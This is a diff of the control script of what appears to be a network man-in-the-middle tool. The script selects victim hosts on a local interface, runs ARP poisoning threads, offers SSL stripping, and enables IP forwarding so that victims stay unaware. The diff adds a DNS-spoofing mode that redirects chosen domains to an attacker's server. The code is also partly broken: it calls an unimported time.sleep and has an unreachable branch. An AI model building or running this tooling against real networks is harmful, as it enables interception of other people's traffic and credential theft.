@@ -2,7 +2,7 @@ import multiprocessing, os, sys, threading
 import arp, dns, ssl, scan, parser
 from urllib.parse import urlparse
 from time import sleep
-
+import ipaddress, socket
 sslRequested = False
 
 
@@ -11,6 +11,13 @@ def is_valid_link(x):
         result = urlparse(x)
         return all([result.scheme, result.netloc])
     except:
+        return False
+
+def is_valid_ip(x):
+    try:
+        ip = ipaddress.ip_address(x)
+        return True
+    except ValueError:
         return False
 
 
@@ -42,12 +49,10 @@ def discover():
                 answr = yes_no()
 
                 if answr == 0:  # yes
-                    print(hosts)
                     print("Poisoning all hosts on the interface", interface)
                 else:  # no
 
-                    print(
-                        "The following hosts are up and running. Pick the number of the host(s) you want to poison:")
+                    print("The following hosts are up and running. Pick the number of the host(s) you want to poison:")
                     counter = 1
                     for host in hosts:
                         print("[", counter, "] Host with IP",
@@ -92,113 +97,127 @@ def yes_no():
 
     return answr
 
-try:
-    #if not args.help
+
+
+#if not args.help
+args = parser.import_args()
+
+if args.ARP:
+    interval = args.ARP
+
+    spacing()
+
     interface, hosts = discover()
-    args = parser.import_args()
 
-    if args.ARP:
-        interval = args.ARP
-        spacing()
+    spacing()
 
-        # some threads around here i guess
+    # some threads around here i guess
 
-        print("Want to do SSL strip on the victims while ARP poisoning them? Y/N")
-        answr = yes_no()
+    print("Want to do SSL strip on the victims while ARP poisoning them? Y/N")
+    answr = yes_no()
 
-        if answr is 0:
-            sslRequested = True
-            print("SSL Strip will be done")
-        else:
-            sslRequested = False
-            print("No SSL strip.")
+    if answr is 0:
+        sslRequested = True
+        print("SSL Strip will be done")
+    else:
+        sslRequested = False
+        print("No SSL strip.")
 
-        spacing()
+    spacing()
 
-        # if silent
+    # if silent
 
-        if args.silent:
-            print("Silent mode on. Forwarding intercepted packets to oiriginal destination")
-            os.system("sysctl -w net.ipv4.ip_forward=1")
-        else:
-            print("Silent mode off. The victims might notice the attack and take measures against it.")
-            os.system("sysctl -w net.ipv4.ip_forward=0")
+    if args.silent:
+        print("Silent mode on. Forwarding intercepted packets to oiriginal destination")
+        os.system("sysctl -w net.ipv4.ip_forward=1")
+    else:
+        print("Silent mode off. The victims might notice the attack and take measures against it.")
+        os.system("sysctl -w net.ipv4.ip_forward=0")
 
-        spacing()
+    spacing()
 
-        print("Begin ARP poisoning")
+    print("Begin ARP poisoning")
 
-        spacing()
+    spacing()
 
-        # arpAttack = arp.Poison(interface, hosts, interval)
-        # try:
-        #     arpProcess = multiprocessing.Process(target=arpAttack.poison, name="ARP Poison")
-        #     arpProcess.start()
-        # except KeyboardInterrupt:
-        #     print("Stopping the arp process.")
+    # arpAttack = arp.Poison(interface, hosts, interval)
+    # try:
+    #     arpProcess = multiprocessing.Process(target=arpAttack.poison, name="ARP Poison")
+    #     arpProcess.start()
+    # except KeyboardInterrupt:
+    #     print("Stopping the arp process.")
 
-        # #sleep(5)
+    # #sleep(5)
 
-        # if sslRequested == True:
-        #     ssl = ssl.SSLStrip()
-        #     try:
-        #         sslProcess = multiprocessing.Process(
-        #             target=ssl.strip, name="SSL Strip")
-        #         sslProcess.start()
-        #     except KeyboardInterrupt:
-        #         print("Stopping the arp process.")
+    # if sslRequested == True:
+    #     ssl = ssl.SSLStrip()
+    #     try:
+    #         sslProcess = multiprocessing.Process(
+    #             target=ssl.strip, name="SSL Strip")
+    #         sslProcess.start()
+    #     except KeyboardInterrupt:
+    #         print("Stopping the arp process.")
 
 
-        arp = arp.Poison(interface, hosts, interval)
+    arp = arp.Poison(interface, hosts, interval)
+    try:
+        arpThread = threading.Thread(target=arp.poison, name="ARP Poison")
+        arpThread.start()
+    except KeyboardInterrupt:
+        arpThread.join()
+
+    sleep(5)
+
+    if sslRequested == True:
+        ssl = ssl.SSLStrip()
         try:
-            arpThread = threading.Thread(target=arp.poison, name="ARP Poison")
-            arpThread.start()
+            sslThread = threading.Thread(target=ssl.strip, name="SSL Strip")
+            sslThread.start()
         except KeyboardInterrupt:
-            arpThread.join()
+            sslThread.join()
 
-        sleep(5)
+elif args.DNS:
+    server = args.DNS
 
-        if sslRequested == True:
-            ssl = ssl.SSLStrip()
+    if is_valid_ip(server):
+        print("Which domains would you like to spoof? These will be redirected to your host server,", server)
+        websites = input().split()
+
+        to_spoof = []
+        for link in websites:
             try:
-                sslThread = threading.Thread(target=ssl.strip, name="SSL Strip")
-                sslThread.start()
-            except KeyboardInterrupt:
-                sslThread.join()
+                website_ip = socket.gethostbyname(link)
+                to_spoof.append([link, website_ip])
+            except Exception:
+                print(link, "is not a valid link. It will not be spoofed.")
 
-    elif args.DNS:
-        websites = args.DNS
+        if not to_spoof:
+            print("None of the provided websited were valid domain names. Please retry.")
+            sys.exit()
+    else:
+        print("It seems like the server IP provided as an argument is incorrect. Please reconfigure.")
+        sys.exit()
 
-        arpAttack = arp.Poison(interface, hosts, 5)
-        try:
-            arpProcess = multiprocessing.Process(target=arpAttack.poison, name="ARP Poison")
-            arpProcess.start()
-        except KeyboardInterrupt:
-            print("Stopping the arp process.")
+    spacing()
 
-        dns = dns.Poison()
-        packet = dns.sniff()
-        try:
-            dnsProcess = multiprocessing.Process(target=dns.reply, args=packet, name="DNS Poison")
-            dnsProcess.start()
-        except KeyboardInterrupt:
-            print("Stopping the dns process.")
+    interface, hosts = discover()
 
-        # no_issue = True  # check if there is an issue with one of the urls. assume there is no issue
-        # for url in websites:
-        #     no_issue = no_issue and is_valid_link(url)
+    spacing()
 
-        # if no_issue:
-        #     # HERE YOU CALL DNS POISONING FUNCTION
-        #     print(websites)
-        # else:
-        #     print("Cannot begin DNS poisoning. One or more URLs were not correct.\n")
-        #     print("------------------------------------------------------------------\n")
-        #     for url in websites:
-        #         if not is_valid_link(url):
-        #             print(
-        #                 "-", url, "is not a valid weblink. Did you append \"https://\" or \"http://\"?")
-except KeyboardInterrupt:
-    arpThread.terminate()
-    sslThread.terminate()
-    print("Stopping the tool.")
+    # setting up arp poison process with default recommended frequencey 10
+    arp = arp.Poison(interface, hosts, 10)
+    arpProcess = multiprocessing.Process(target=arp.poison, name="ARP Poison")
+    arpProcess.start()
+
+    # let the arp poisoning run a bit before starting dns poisoning
+    time.sleep(5)
+
+    # setting up dns poison proces
+    dns = dns.Poison(interface, server, to_spoof)
+    packet = dns.sniff()
+    dnsProcess = multiprocessing.Process(target=dns.reply, args=(packet,), name="DNS Poison")
+    dnsProcess.start()
+
+elif args.silent and args.DNS:
+    print("Oops! DNS poisoning does not support silent mode. The packets will not be forwarded.")
+    sys.exit()
